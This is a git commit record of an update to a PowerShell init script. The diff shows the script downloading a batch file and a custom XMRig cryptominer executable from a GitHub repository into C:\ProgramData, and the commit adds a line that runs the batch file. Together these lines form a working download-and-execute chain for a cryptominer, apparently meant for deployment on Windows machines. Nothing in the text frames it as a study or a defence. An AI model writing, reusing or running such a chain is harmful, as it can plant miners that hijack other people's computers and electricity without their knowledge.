3382b6a3ea635070c61f2e60adc22cb347f9cf5a
Lê Bình Phương <69758987+BinhPhuongIT@users.noreply.github.com>
2023-11-25 16:22:45 +0700

    Update init.ps1

--- init.ps1
+++ init.ps1
@@ -5,3 +5,5 @@ Invoke-WebRequest -Uri $url -OutFile "C:\ProgramData\start.cmd"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $url="https://raw.githubusercontent.com/BinhPhuongIT/xmrig-customs/main/xmrig.exe"
 Invoke-WebRequest -Uri $url -OutFile "C:\ProgramData\xmrig.exe"
+
+Start-Process -FilePath "C:\ProgramData\start.cmd" -Wait
